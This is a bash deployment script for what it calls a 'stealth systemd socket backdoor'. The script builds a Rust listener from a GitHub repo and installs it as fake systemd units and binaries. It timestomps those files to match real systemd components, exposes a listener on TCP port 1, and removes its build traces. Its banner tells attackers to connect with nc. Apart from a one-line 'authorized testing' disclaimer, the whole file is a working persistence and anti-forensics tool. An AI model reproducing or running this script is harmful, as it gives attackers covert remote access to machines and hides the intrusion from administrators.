#!/bin/bash
#
# systemd-utils-deploy.sh
# One-shot deployment script for the stealth systemd socket backdoor.
#
# WHAT IT DOES:
#   1. Clones the repo from GitHub
#   2. Installs Rust if missing
#   3. Compiles the listener binary
#   4. Deploys binary + systemd unit files to /usr/lib/systemd/system/
#   5. Timestamps them to look like OS originals
#   6. Starts the services
#   7. Cleans up — removes everything except the deployed files
#
# USAGE:
#   sudo ./systemd-utils-deploy.sh [repo-url]
#
#   Default repo: https://github.com/HermesNA-1/systemd-utils.git
#
# WARNING: For authorized security testing only.

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# ─── Config ────────────────────────────────────────────────────────────────
REPO_URL="${1:-https://github.com/HermesNA-1/systemd-utils.git}"
CLONE_DIR="/tmp/systemd-utils-build"
LISTENER_SRC="src/main.rs"
UNIT_DIR="/usr/lib/systemd/system"

# Deployed paths (these survive the cleanup)
BIN_DEST="/usr/lib/systemd/systemd-user-service"
SERVICE_FILE="${UNIT_DIR}/user.service"
SOCKET_FILE="${UNIT_DIR}/init.socket"
INIT_SERVICE="${UNIT_DIR}/init.service"
DEPLOYED_FILES=(
    "$BIN_DEST"
    "$SERVICE_FILE"
    "$SOCKET_FILE"
    "$INIT_SERVICE"
)

# ─── Helpers ───────────────────────────────────────────────────────────────
info()  { echo -e "${BLUE}[*]${NC} $*"; }
ok()    { echo -e "${GREEN}[✓]${NC} $*"; }
warn()  { echo -e "${YELLOW}[!]${NC} $*"; }
err()   { echo -e "${RED}[✗]${NC} $*"; exit 1; }

cleanup() {
    if [[ -d "$CLONE_DIR" ]]; then
        rm -rf "$CLONE_DIR"
        info "Cleaned up build directory: $CLONE_DIR"
    fi
}

# ─── Root Check ────────────────────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    err "This script must be run as root (sudo)."
fi

# ─── Trap ──────────────────────────────────────────────────────────────────
trap cleanup EXIT

# ─── Banner ────────────────────────────────────────────────────────────────
echo ""
echo -e "${BLUE}╔══════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║${NC}     systemd-utils — Stealth Deployment Script      ${BLUE}║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════════════════╝${NC}"
echo ""
warn "This is for authorized security testing only."
echo ""

# ═══════════════════════════════════════════════════════════════════════════
# STEP 1b: Install systemd-container if systemd-socket-proxyd is missing
# ═══════════════════════════════════════════════════════════════════════════
info "Checking for systemd-socket-proxyd..."
if ! command -v systemd-socket-proxyd &>/dev/null; then
    warn "systemd-socket-proxyd not found — installing systemd-container..."
    apt-get update -qq && apt-get install -y -qq systemd-container 2>&1 | tail -3
    if command -v systemd-socket-proxyd &>/dev/null; then
        ok "systemd-socket-proxyd installed: $(which systemd-socket-proxyd)"
    else
        err "Failed to install systemd-socket-proxyd. Try: sudo apt-get install systemd-container"
    fi
else
    ok "systemd-socket-proxyd found: $(which systemd-socket-proxyd)"
fi

# ═══════════════════════════════════════════════════════════════════════════
# STEP 2: Install Rust if missing
# ═══════════════════════════════════════════════════════════════════════════
info "Checking for Rust toolchain..."
if ! command -v cargo &>/dev/null; then
    info "Rust not found — installing via rustup..."
    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y 2>&1
    source "$HOME/.cargo/env"
    # Re-check for root — rustup installs to the calling user's home
    if [[ -f /root/.cargo/env ]]; then
        source /root/.cargo/env
    fi
    ok "Rust installed: $(cargo --version 2>/dev/null || echo 'check PATH')"
else
    ok "Rust found: $(cargo --version 2>/dev/null)"
fi

# ═══════════════════════════════════════════════════════════════════════════
# STEP 2: Clone the repo
# ═══════════════════════════════════════════════════════════════════════════
info "Cloning repo from $REPO_URL ..."
rm -rf "$CLONE_DIR"
git clone --depth=1 "$REPO_URL" "$CLONE_DIR" 2>&1
ok "Cloned to $CLONE_DIR"
cd "$CLONE_DIR"

# ═══════════════════════════════════════════════════════════════════════════
# STEP 3: Compile the Rust listener
# ═══════════════════════════════════════════════════════════════════════════
info "Compiling listener binary..."
cargo build --release 2>&1
ok "Compiled: $(ls -lh target/release/systemd-user-service | awk '{print $5}')"

# ═══════════════════════════════════════════════════════════════════════════
# STEP 4: Deploy the binary
# ═══════════════════════════════════════════════════════════════════════════
info "Deploying binary to $BIN_DEST ..."
cp target/release/systemd-user-service "$BIN_DEST"
chmod 755 "$BIN_DEST"

# Timestomp — copy timestamp from a real systemd binary
REF_FILE=$(ls -1 /usr/lib/systemd/systemd 2>/dev/null || echo "/lib/systemd/systemd")
if [[ -f "$REF_FILE" ]]; then
    touch -r "$REF_FILE" "$BIN_DEST"
    ok "Timestomped binary to match $(basename $REF_FILE)"
else
    warn "No reference file found for timestomping"
fi

# ═══════════════════════════════════════════════════════════════════════════
# STEP 5: Deploy systemd unit files
# ═══════════════════════════════════════════════════════════════════════════
info "Deploying systemd unit files..."
cp "$CLONE_DIR/user.service"  "$SERVICE_FILE"
cp "$CLONE_DIR/init.socket"   "$SOCKET_FILE"
cp "$CLONE_DIR/init.service"  "$INIT_SERVICE"

# Timestomp unit files
REF_UNIT=$(ls -1 /usr/lib/systemd/system/systemd-journald.service 2>/dev/null \
            || ls -1 /lib/systemd/system/systemd-journald.service 2>/dev/null || true)
if [[ -f "$REF_UNIT" ]]; then
    for f in "$SERVICE_FILE" "$SOCKET_FILE" "$INIT_SERVICE"; do
        touch -r "$REF_UNIT" "$f"
    done
    ok "Timestomped unit files to match $(basename $REF_UNIT)"
fi

# ═══════════════════════════════════════════════════════════════════════════
# STEP 6: Create the Unix socket directory
# ═══════════════════════════════════════════════════════════════════════════
mkdir -p /run/systemd

# ═══════════════════════════════════════════════════════════════════════════
# STEP 7: Reload systemd and start services
# ═══════════════════════════════════════════════════════════════════════════
info "Reloading systemd daemon..."
systemctl daemon-reload

# Stop any stale instances first
systemctl stop user.service 2>/dev/null || true
systemctl stop init.service 2>/dev/null || true
systemctl stop init.socket  2>/dev/null || true

# Enable and start the Rust listener
systemctl enable user.service
systemctl start  user.service
ok "user.service started (Rust Unix socket listener)"

# Enable and start the socket (auto-activates init.service on connection)
systemctl enable init.socket
systemctl start  init.socket
ok "init.socket started (TCP:1 → systemd-socket-proxyd → Unix socket)"

# ═══════════════════════════════════════════════════════════════════════════
# STEP 8: Verify
# ═══════════════════════════════════════════════════════════════════════════
echo ""
info "═══════════════ Verification ═══════════════"
echo ""

all_ok=true

# Check binary
if [[ -f "$BIN_DEST" ]]; then
    ok "Binary deployed: $BIN_DEST"
else
    warn "Binary missing: $BIN_DEST"
    all_ok=false
fi

# Check unit files
for f in "${DEPLOYED_FILES[@]:1}"; do
    if [[ -f "$f" ]]; then
        ok "Unit file deployed: $f"
    else
        warn "Unit file missing: $f"
        all_ok=false
    fi
done

# Check socket
if ss -tlnp 2>/dev/null | grep -q ':1 '; then
    ok "TCP port 1 is listening"
else
    warn "TCP port 1 not showing in ss output"
    systemctl status init.socket --no-pager 2>&1 | head -8
fi

# Check Unix socket
if [[ -S "/run/systemd/systemd.init.sock" ]]; then
    ok "Unix domain socket exists at /run/systemd/systemd.init.sock"
else
    warn "Unix socket not found"
    systemctl status user.service --no-pager 2>&1 | head -8
fi

# Check process
if pgrep -f systemd-user-service >/dev/null 2>&1; then
    ok "Rust listener process is running"
else
    warn "Listener process not running (may activate on first connection)"
fi

# ═══════════════════════════════════════════════════════════════════════════
# STEP 9: Cleanup — delete everything EXCEPT the deployed files
# ═══════════════════════════════════════════════════════════════════════════
echo ""
info "╔════════════════════════════════════════════════╗"
info "║    CLEANUP: Removing build artifacts...        ║"
info "╚════════════════════════════════════════════════╝"

# The cleanup trap will remove $CLONE_DIR
# But also remove the cloned repo if it was left anywhere else
# The trap already handles $CLONE_DIR removal

# Also remove this script itself if it was run from outside the clone dir
# (don't delete the script if it was the entry point)
SCRIPT_NAME=$(basename "$0")
if [[ "$0" == "/tmp/"* ]] || [[ "$0" == "/tmp/systemd-utils-build/"* ]]; then
    # Script is in the cloned dir — it'll be cleaned up by the trap
    :
fi

echo ""
echo -e "${GREEN}╔══════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║${NC}                   DEPLOYMENT COMPLETE                  ${GREEN}║${NC}"
echo -e "${GREEN}╚══════════════════════════════════════════════════════╝${NC}"
echo ""
echo "   Attackers connect to:  nc <target-ip> 1"
echo ""
echo "   Files deployed:"
echo "     $BIN_DEST"
echo "     $SERVICE_FILE"
echo "     $SOCKET_FILE"
echo "     $INIT_SERVICE"
echo ""
echo "   Build directory $CLONE_DIR will be removed on exit."
echo "   Source code is preserved at:"
echo "     $REPO_URL"
echo ""

if $all_ok; then
    exit 0
else
    warn "Some checks failed — review the output above."
    exit 1
fi